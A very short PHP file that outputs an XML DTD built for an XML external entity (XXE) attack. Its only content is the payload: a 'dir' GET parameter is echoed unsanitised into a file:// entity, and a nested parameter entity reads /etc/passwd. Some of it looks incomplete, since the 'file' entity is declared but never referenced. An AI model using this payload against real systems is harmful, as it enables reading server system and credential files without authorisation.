<?php
$dir = $_GET['dir'];
?>

<!ENTITY % file SYSTEM "file:///<?php echo $dir;?>">
<!ENTITY % ext "<!ENTITY &#x25; exfil SYSTEM 'file:///etc/passwd'>">
%ext;
%exfil;
